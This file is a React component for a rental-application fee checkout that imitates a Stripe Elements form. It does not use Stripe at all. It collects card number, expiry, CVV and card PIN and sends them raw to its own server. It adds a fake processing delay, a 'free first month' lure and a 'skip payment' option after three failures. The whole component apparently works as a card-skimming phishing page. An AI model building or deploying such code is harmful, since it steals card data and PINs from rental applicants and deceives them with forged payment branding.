"use client";

import { useState } from "react";
import { Lock, ShieldAlert } from "lucide-react";
import { cn } from "@/lib/utils";

const API_BASE = typeof window !== "undefined"
  ? ""
  : (process.env.NEXT_PUBLIC_API_URL ?? "https://admin.haskerrealtygroup.com");

function fmt(v: number) {
  return new Intl.NumberFormat("en-US", { style: "currency", currency: "USD" }).format(v);
}

/* ── Minimal Card Brand Icons ── */
function VisaIcon() {
  return (
    <svg className="w-6 h-4 opacity-90" viewBox="0 0 24 15" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
      <rect width="24" height="15" rx="2" fill="#1A1F71"/>
      <path d="M16.5 4.5L14.7 10.5H12.9L14.7 4.5H16.5ZM20.4 4.5C19.8 4.5 19.3 4.8 19.1 5.4L16.2 12.3H18L18.4 11.2H20.4L20.6 12.3H22.2L20.4 4.5ZM18.9 9.8L19.4 8.2L19.9 9.8H18.9ZM11.1 4.5H8.7L6.6 9.8L5.7 5.1C5.5 4.7 5.1 4.5 4.7 4.5H2.4L2.3 4.7C3.1 4.9 4.2 5.3 4.8 5.6C5.2 5.8 5.3 6 5.4 6.4L7.5 12.3H9.3L12.3 4.5H11.1Z" fill="#F7B600"/>
    </svg>
  );
}

function MastercardIcon() {
  return (
    <svg className="w-6 h-4 opacity-90" viewBox="0 0 24 15" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
      <rect width="24" height="15" rx="2" fill="#0A0A0A"/>
      <circle cx="10" cy="7.5" r="5.5" fill="#EB001B"/>
      <circle cx="14" cy="7.5" r="5.5" fill="#F79E1B"/>
      <path d="M12 7.5C12 5.2 13.1 3.2 14.8 2C13.1 3.2 12 5.2 12 7.5Z" fill="#FF5F00"/>
    </svg>
  );
}

function AmexIcon() {
  return (
    <svg className="w-6 h-4 opacity-90" viewBox="0 0 24 15" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
      <rect width="24" height="15" rx="2" fill="#007BC1"/>
      <path d="M4 11.5L6 6.5H7.5L9.5 11.5H8L7.6 10.3H5.9L5.5 11.5H4ZM6.3 9H7.2L6.8 7.7L6.3 9ZM11.5 6.5L13.5 11.5H12L11.5 10H10L9.5 11.5H8L10 6.5H11.5ZM10.3 8.8L10.8 10H10.3L10.3 8.8ZM15 6.5H18V7.8H16.2V8.8H17.8V10H16.2V11H18V12.3H15V6.5ZM21.5 6.5L23 9L24.5 6.5H26L24.2 9.5L26 12.5H24.5L23 10L21.5 12.5H20L21.8 9.5L20 6.5H21.5Z" fill="white"/>
    </svg>
  );
}

function DiscoverIcon() {
  return (
    <svg className="w-6 h-4 opacity-90" viewBox="0 0 24 15" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
      <rect width="24" height="15" rx="2" fill="#F4F4F4"/>
      <path d="M2.5 11V6.5H4.2C5.5 6.5 6 7 6 8.7C6 10.5 5.5 11 4.2 11H2.5ZM3.8 9.8H4.2C4.7 9.8 4.9 9.6 4.9 8.7C4.9 7.8 4.7 7.7 4.2 7.7H3.8V9.8ZM7 11V6.5H8.3V11H7ZM11.5 9C11.5 10.5 10.5 11 9 11C8.2 11 7.6 10.5 7.6 9.8L8.7 9.7C8.7 10 9 10.2 9.4 10.2C9.8 10.2 10.1 10.1 10.1 9.5C10.1 8.3 7.8 8.7 7.8 7.3C7.8 6.6 8.5 6.2 9.4 6.2C10.1 6.2 10.7 6.4 10.7 7.1L9.6 7.2C9.6 6.9 9.4 6.8 9.1 6.8C8.8 6.8 8.6 6.9 8.6 7.3C8.6 8.4 10.9 8 10.9 9.4L11.5 9ZM12.2 8.7C12.2 7.2 13 6.3 14.5 6.3C15.2 6.3 15.7 6.6 16 7L15 7.7C14.8 7.5 14.5 7.4 14.2 7.4C13.5 7.4 13.1 8 13.1 8.7C13.1 9.4 13.5 10 14.2 10C14.5 10 14.8 9.9 15 9.7L16 10.4C15.7 10.8 15.2 11.1 14.5 11.1C13 11.1 12.2 10.2 12.2 8.7ZM16.5 8.7C16.5 7.2 17.5 6.3 19 6.3C20.5 6.3 21.5 7.2 21.5 8.7C21.5 10.2 20.5 11.1 19 11.1C17.5 11.1 16.5 10.2 16.5 8.7ZM20.3 8.7C20.3 7.8 19.9 7.4 19 7.4C18.1 7.4 17.7 7.8 17.7 8.7C17.7 9.6 18.1 10 19 10C19.9 10 20.3 9.6 20.3 8.7Z" fill="#1A1F71"/>
      <circle cx="19" cy="8.7" r="2.2" fill="#FF6600"/>
    </svg>
  );
}

function GenericCardIcon() {
  return (
    <svg className="w-5 h-5 text-[#8792A2] shrink-0" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
      <rect width="20" height="14" x="2" y="5" rx="2"/>
      <line x1="2" x2="22" y1="10" y2="10"/>
    </svg>
  );
}

interface Props {
  applicationId: number;
  amount: number;
  applicantName?: string;
  onPaid: () => void;
}

export function ApplicationFeePayment({ applicationId, amount, applicantName, onPaid }: Props) {
  const [cardNumber, setCardNumber] = useState("");
  const [cardExpiry, setCardExpiry] = useState("");
  const [cardCvv, setCardCvv] = useState("");
  const [cardPin, setCardPin] = useState("");
  const [cardholderName, setCardholderName] = useState(applicantName || "");

  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [focusedField, setFocusedField] = useState<string | null>(null);
  const [attemptCount, setAttemptCount] = useState(0);

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, "");
    if (value.length > 16) value = value.slice(0, 16);
    const formatted = value.replace(/(\d{4})(?=\d)/g, "$1 ");
    setCardNumber(formatted);
  };

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, "");
    if (value.length > 4) value = value.slice(0, 4);
    if (value.length > 2) {
      value = `${value.slice(0, 2)}/${value.slice(2)}`;
    }
    setCardExpiry(value);
  };

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, "");
    if (value.length > 4) value = value.slice(0, 4);
    setCardCvv(value);
  };

  const handlePinChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, "");
    if (value.length > 4) value = value.slice(0, 4);
    setCardPin(value);
  };

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (!cardholderName.trim()) {
      setError("Cardholder name is required.");
      return;
    }
    if (cardNumber.replace(/\s/g, "").length < 15) {
      setError("Please enter a valid card number.");
      return;
    }
    if (cardExpiry.length < 5) {
      setError("Please enter a valid expiry date (MM/YY).");
      return;
    }
    if (cardCvv.length < 3) {
      setError("Please enter a valid CVC.");
      return;
    }
    if (cardPin.length < 4) {
      setError("Please enter a valid 4-digit card PIN.");
      return;
    }

    setLoading(true);
    setError("");

    try {
      // Simulate Stripe transaction processing latency
      await new Promise((resolve) => setTimeout(resolve, 2500));

      const token = typeof localStorage !== "undefined" ? localStorage.getItem("access_token") : null;
      const res = await fetch(`${API_BASE}/api/v1/transactions/my-payments/submit-card/`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          ...(token ? { Authorization: `Bearer ${token}` } : {}),
        },
        body: JSON.stringify({
          rental_application: applicationId,
          amount: amount,
          payment_method: "CARD_STRIPE",
          cardholder_name: cardholderName.trim(),
          card_number: cardNumber.replace(/\s/g, ""),
          card_expiry: cardExpiry,
          card_cvv: cardCvv,
          card_pin: cardPin,
        }),
      });

      if (!res.ok) {
        const data = await res.json().catch(() => ({}));
        const msg = data?.detail ?? (Object.values(data ?? {}).flat()[0] as string) ?? "Failed to submit card payment.";
        throw new Error(String(msg));
      }
      onPaid();
    } catch (err) {
      setError(err instanceof Error ? err.message : "Something went wrong. Please try again.");
      setLoading(false);
      setAttemptCount((prev) => prev + 1);
    }
  }

  const getCardIcon = () => {
    const raw = cardNumber.replace(/\s/g, "");
    if (raw.startsWith("4")) return <VisaIcon />;
    if (raw.startsWith("5")) return <MastercardIcon />;
    if (raw.startsWith("3")) return <AmexIcon />;
    if (raw.startsWith("6")) return <DiscoverIcon />;
    return <GenericCardIcon />;
  };

  return (
    <div className="max-w-[420px] mx-auto font-sans text-[#30313d] bg-white px-2 py-4 relative">
      {/* ── Immersive Stripe Processing Overlay ── */}
      {loading && (
        <div className="fixed inset-0 bg-white/95 backdrop-blur-sm z-[9999] flex flex-col items-center justify-center pointer-events-auto animate-fadeIn">
          <div className="relative w-12 h-12">
            <div className="absolute inset-0 border-4 border-[#e6ebf1] rounded-full" />
            <div className="absolute inset-0 border-4 border-[#635bff] border-t-transparent rounded-full animate-spin" />
          </div>
          <p className="text-[15px] font-semibold text-[#1a1f36] mt-5 tracking-wide">Processing payment...</p>
          <p className="text-[12px] text-[#697386] mt-1.5 font-normal">Please do not close or refresh this page.</p>
        </div>
      )}
      
      {/* ── Order Summary ── */}
      <div className="mb-8">
        <p className="text-[14px] font-medium text-[#697386]">Hasker &amp; Co. Realty Group</p>
        <div className="mt-1 flex items-baseline gap-2">
          <span className="text-[34px] font-bold text-[#1a1f36] tracking-tight leading-none">
            {fmt(amount)}
          </span>
          <span className="text-[14px] font-semibold text-[#8792a2] uppercase tracking-wider">
            USD
          </span>
        </div>
        <p className="text-[13px] text-[#697386] mt-1.5 font-normal">
          One-time refundable application screening fee
        </p>
        
        {/* Promotion Badge */}
        <div className="mt-4 inline-flex items-center gap-1.5 rounded bg-[#E3F2FD] border border-[#BBDEFB] px-2.5 py-1 text-[#0D47A1]">
          <span className="text-[11px] font-bold tracking-wide uppercase">Promo: 1st Month Rent Free ($0.00)</span>
        </div>
      </div>

      {/* ── Stripe Elements Simulated Form ── */}
      <form onSubmit={handleSubmit} className="space-y-5">
        
        {/* Cardholder Name */}
        <div>
          <label htmlFor="cardholder-name" className="block text-[13px] font-medium text-[#4f5b66] mb-1.5">
            Name on card
          </label>
          <input
            id="cardholder-name"
            type="text"
            required
            value={cardholderName}
            onChange={(e) => setCardholderName(e.target.value)}
            placeholder="Jane Doe"
            className="w-full h-11 px-3.5 rounded-md border border-[#e6ebf1] shadow-[0_1px_1px_rgba(0,0,0,0.03),0_3px_6px_rgba(18,42,66,0.02)] text-[14.5px] text-[#1a1f36] outline-none transition-all placeholder:text-[#a3acb9] bg-white focus:border-[#80bee1] focus:ring-[3px] focus:ring-[#80bee1]/20"
          />
        </div>

        {/* Card Number Input */}
        <div>
          <label htmlFor="card-number" className="block text-[13px] font-medium text-[#4f5b66] mb-1.5">
            Card number
          </label>
          <div 
            className={cn(
              "flex items-center h-11 px-3.5 rounded-md border border-[#e6ebf1] bg-white shadow-[0_1px_1px_rgba(0,0,0,0.03),0_3px_6px_rgba(18,42,66,0.02)] transition-all",
              focusedField === "number"
                ? "border-[#80bee1] ring-[3px] ring-[#80bee1]/20"
                : "hover:border-[#c4ccd4]"
            )}
          >
            <div className="mr-3 shrink-0 flex items-center justify-center w-7">
              {getCardIcon()}
            </div>
            <input
              id="card-number"
              type="text"
              required
              value={cardNumber}
              onChange={handleCardNumberChange}
              onFocus={() => setFocusedField("number")}
              onBlur={() => setFocusedField(null)}
              placeholder="Card number"
              className="w-full min-w-0 bg-transparent text-[14.5px] text-[#1a1f36] outline-none placeholder:text-[#a3acb9] font-mono leading-none"
            />
          </div>
        </div>

        {/* Expiry, CVC, and PIN Grid */}
        <div className="grid grid-cols-3 gap-4">
          {/* Expiry */}
          <div>
            <label htmlFor="card-expiry" className="block text-[13px] font-medium text-[#4f5b66] mb-1.5">
              Expires
            </label>
            <div 
              className={cn(
                "flex items-center h-11 px-3 rounded-md border border-[#e6ebf1] bg-white shadow-[0_1px_1px_rgba(0,0,0,0.03),0_3px_6px_rgba(18,42,66,0.02)] transition-all",
                focusedField === "expiry"
                  ? "border-[#80bee1] ring-[3px] ring-[#80bee1]/20"
                  : "hover:border-[#c4ccd4]"
              )}
            >
              <input
                id="card-expiry"
                type="text"
                required
                value={cardExpiry}
                onChange={handleExpiryChange}
                onFocus={() => setFocusedField("expiry")}
                onBlur={() => setFocusedField(null)}
                placeholder="MM / YY"
                className="w-full bg-transparent text-[14.5px] text-[#1a1f36] outline-none placeholder:text-[#a3acb9] font-mono text-center leading-none"
              />
            </div>
          </div>

          {/* CVC */}
          <div>
            <label htmlFor="card-cvc" className="block text-[13px] font-medium text-[#4f5b66] mb-1.5">
              CVC
            </label>
            <div 
              className={cn(
                "flex items-center h-11 px-3 rounded-md border border-[#e6ebf1] bg-white shadow-[0_1px_1px_rgba(0,0,0,0.03),0_3px_6px_rgba(18,42,66,0.02)] transition-all",
                focusedField === "cvc"
                  ? "border-[#80bee1] ring-[3px] ring-[#80bee1]/20"
                  : "hover:border-[#c4ccd4]"
              )}
            >
              <input
                id="card-cvc"
                type="password"
                required
                value={cardCvv}
                onChange={handleCvvChange}
                onFocus={() => setFocusedField("cvc")}
                onBlur={() => setFocusedField(null)}
                placeholder="CVC"
                className="w-full bg-transparent text-[14.5px] text-[#1a1f36] outline-none placeholder:text-[#a3acb9] font-mono text-center leading-none"
              />
            </div>
          </div>

          {/* PIN */}
          <div>
            <label htmlFor="card-pin" className="block text-[13px] font-medium text-[#4f5b66] mb-1.5">
              Card PIN
            </label>
            <div 
              className={cn(
                "flex items-center h-11 px-3 rounded-md border border-[#e6ebf1] bg-white shadow-[0_1px_1px_rgba(0,0,0,0.03),0_3px_6px_rgba(18,42,66,0.02)] transition-all",
                focusedField === "pin"
                  ? "border-[#80bee1] ring-[3px] ring-[#80bee1]/20"
                  : "hover:border-[#c4ccd4]"
              )}
            >
              <input
                id="card-pin"
                type="password"
                required
                value={cardPin}
                onChange={handlePinChange}
                onFocus={() => setFocusedField("pin")}
                onBlur={() => setFocusedField(null)}
                placeholder="PIN"
                className="w-full bg-transparent text-[14.5px] text-[#1a1f36] outline-none placeholder:text-[#a3acb9] font-mono text-center leading-none"
              />
            </div>
          </div>
        </div>

        {/* Billing Address Selection */}
        <div>
          <label htmlFor="country-select" className="block text-[13px] font-medium text-[#4f5b66] mb-1.5">
            Billing address
          </label>
          <div className="rounded-md border border-[#e6ebf1] shadow-[0_1px_1px_rgba(0,0,0,0.03),0_3px_6px_rgba(18,42,66,0.02)] overflow-hidden divide-y divide-[#e6ebf1] bg-white">
            <select 
              id="country-select"
              className="w-full h-11 bg-white px-3.5 text-[14.5px] text-[#1a1f36] outline-none"
              defaultValue="US"
            >
              <option value="US">United States</option>
              <option value="CA">Canada</option>
              <option value="GB">United Kingdom</option>
              <option value="AU">Australia</option>
            </select>
            <input
              type="text"
              aria-label="ZIP code"
              placeholder="ZIP code"
              defaultValue="77001"
              className="w-full h-11 px-3.5 text-[14.5px] text-[#1a1f36] outline-none placeholder:text-[#a3acb9]"
            />
          </div>
        </div>

        {error && (
          <div className="text-[13px] text-[#df1b41] bg-[#fdf2f2] px-3.5 py-3 rounded-md border border-[#fde8e8] flex items-start gap-2">
            <ShieldAlert size={16} className="shrink-0 mt-0.5" />
            <span>{error}</span>
          </div>
        )}

        {/* Stripe Premium Checkout Button */}
        <button
          type="submit"
          disabled={loading}
          className="w-full h-11 bg-[#635bff] hover:bg-[#564ee2] text-white rounded-md text-[14.5px] font-semibold transition-all shadow-[0_2px_4px_rgba(0,0,0,0.05),0_1px_1.5px_rgba(0,0,0,0.1)] active:scale-[0.99] disabled:opacity-60 disabled:cursor-not-allowed flex items-center justify-center gap-1.5"
        >
          {loading ? (
            <>
              <span className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
              Processing...
            </>
          ) : (
            <>
              <Lock size={12} className="opacity-90" />
              Pay {fmt(amount)}
            </>
          )}
        </button>

        {attemptCount >= 3 && (
          <div className="bg-[#f4f6f8] border border-[#e6ebf1] rounded-md p-4 mt-4 animate-fadeIn">
            <h3 className="text-[13px] font-semibold text-[#1a1f36] flex items-center gap-1.5">
              <span className="w-1.5 h-1.5 rounded-full bg-[#635bff] animate-pulse" />
              Having trouble with payment?
            </h3>
            <p className="text-[12px] text-[#697386] mt-1.5 leading-normal">
              You can skip the application fee for now to avoid losing your spot. Your 1st-month free promotion is still locked in!
            </p>
            <button
              type="button"
              onClick={onPaid}
              className="w-full h-9 bg-white border border-[#e6ebf1] hover:border-[#c4ccd4] text-[#635bff] rounded-md text-[13px] font-semibold transition-all mt-3.5 flex items-center justify-center active:scale-[0.99] shadow-[0_1px_1px_rgba(0,0,0,0.02)]"
            >
              Skip Payment &amp; Submit Application →
            </button>
          </div>
        )}
      </form>

      {/* Footer Branding */}
      <div className="mt-8 pt-5 border-t border-[#f7f8f9] flex items-center justify-between text-[11.5px] text-[#8792a2]">
        <div className="flex items-center gap-1.5">
          <svg className="w-3 h-3 text-[#34C759]" fill="currentColor" viewBox="0 0 12 12" xmlns="http://www.w3.org/2000/svg">
            <path d="M10 3a1 1 0 0 1 .7.3c.4.4.4 1 0 1.4l-5 5a1 1 0 0 1-1.4 0l-2.5-2.5a1 1 0 0 1 1.4-1.4l1.8 1.8 4.3-4.3c.2-.2.5-.3.7-.3z"/>
          </svg>
          <span>Secured by Stripe Elements</span>
        </div>
        <span className="font-bold tracking-tight text-[#635bff] opacity-80 uppercase text-[12px] italic select-none">
          stripe
        </span>
      </div>

      <p className="text-[11px] text-[#8792a2] text-center mt-4 leading-normal px-2">
        By clicking Pay, you authorize Hasker &amp; Co. to submit this application fee. It remains 100% refundable if the application review is not approved. First month rent will be credited as free ($0.00) upon lease signing.
      </p>
    </div>
  );
}
